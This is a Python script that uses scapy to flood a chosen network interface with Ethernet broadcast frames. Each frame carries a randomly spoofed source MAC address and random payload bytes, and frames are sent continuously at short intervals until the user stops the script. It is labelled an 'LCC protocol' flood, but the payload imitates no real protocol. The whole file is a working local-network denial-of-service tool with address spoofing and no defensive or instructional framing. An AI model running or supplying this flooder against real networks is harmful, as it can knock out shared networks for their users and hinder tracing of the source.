import argparse
import logging
import os
import random
import time
from scapy.all import Ether, sendp, Raw

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

class LCCBroadcastFlooder:
    def __init__(self, interface: str, interval: float):
        self.interface = interface
        self.interval = interval

    def start_flood(self):
        logging.info(f'Starting LCC broadcast flood on interface {self.interface}')
        try:
            while True:
                packet = self._create_lcc_broadcast_packet()
                sendp(packet, iface=self.interface, verbose=False)
                logging.debug(f'Sent LCC broadcast packet')
                time.sleep(self.interval)
        except KeyboardInterrupt:
            logging.info('Flooding aborted by user.')

    def _create_lcc_broadcast_packet(self):
        # Ethernet broadcast frame
        dst_mac = "ff:ff:ff:ff:ff:ff"
        src_mac = self._get_random_mac()

        # Here just a random bytes string imitating protocol data
        payload = bytes([random.randint(0, 255) for _ in range(60)])  

        ether_frame = Ether(src=src_mac, dst=dst_mac) / Raw(load=payload)
        return ether_frame

    def _get_random_mac(self):
        mac = [0x00, 0x16, 0x3e,
               random.randint(0x00, 0x7f),
               random.randint(0x00, 0xff),
               random.randint(0x00, 0xff)]
        return ':'.join(f"{x:02x}" for x in mac)


if __name__ == '__main__':
    if os.getuid() != 0:
        logging.critical("This script must be run as root/administrator.")
        exit(1)

    parser = argparse.ArgumentParser(description="LCC Protocol Broadcast Flood")
    parser.add_argument('-i', '--interface', required=True, help='Network interface to send packets on')
    parser.add_argument('--interval', type=float, default=0.01, help='Interval between packets in seconds')

    args = parser.parse_args()

    flooder = LCCBroadcastFlooder(args.interface, args.interval)
    flooder.start_flood()
